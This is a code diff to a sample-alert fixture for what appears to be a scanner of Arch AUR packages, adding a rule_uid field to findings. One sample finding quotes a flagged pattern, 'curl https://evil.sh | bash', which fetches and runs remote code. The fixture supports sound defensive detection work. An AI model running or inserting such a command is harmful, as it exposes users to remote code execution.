@@ -106,6 +106,7 @@ def sample_alert_payload() -> dict:
     """
     from .full_aur.pipeline import CycleResult
     from .notify import alert_payload
+    from .registry import uid_of
 
     cycle = CycleResult(
         added=3,
@@ -124,11 +125,11 @@ def sample_alert_payload() -> dict:
                 "last_modified": 1777593600,
                 "rules": ["R001", "P001"],
                 "findings": [
-                    {"rule_id": "R001", "severity": "CRITICAL", "weight": 30,
-                     "file": "PKGBUILD", "line": 12,
+                    {"rule_id": "R001", "rule_uid": uid_of("R001"), "severity": "CRITICAL",
+                     "weight": 30, "file": "PKGBUILD", "line": 12,
                      "reason": "Remote Script Execution: curl https://evil.sh | bash"},
-                    {"rule_id": "P001", "severity": "INFO", "weight": 0,
-                     "file": "", "line": None,
+                    {"rule_id": "P001", "rule_uid": uid_of("P001"), "severity": "INFO",
+                     "weight": 0, "file": "", "line": None,
                      "reason": "checksums declared for all non-VCS sources"},
                 ],
             }
